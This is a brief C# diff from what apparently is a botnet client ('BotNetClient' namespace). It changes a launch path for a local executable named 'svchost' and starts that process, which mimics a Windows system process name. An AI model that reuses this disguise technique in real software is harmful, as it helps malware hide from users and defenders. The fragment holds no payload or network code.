@@ -14,7 +14,7 @@ namespace BotNetClient
         {
             await Task.Run(()=> {
                 Process proc = new Process();
-                proc.StartInfo.FileName = Environment.CurrentDirectory + @"\svchost.exe";
+                proc.StartInfo.FileName = Environment.CurrentDirectory + @"\svchost";
                 try
                 {
                     proc.Start();
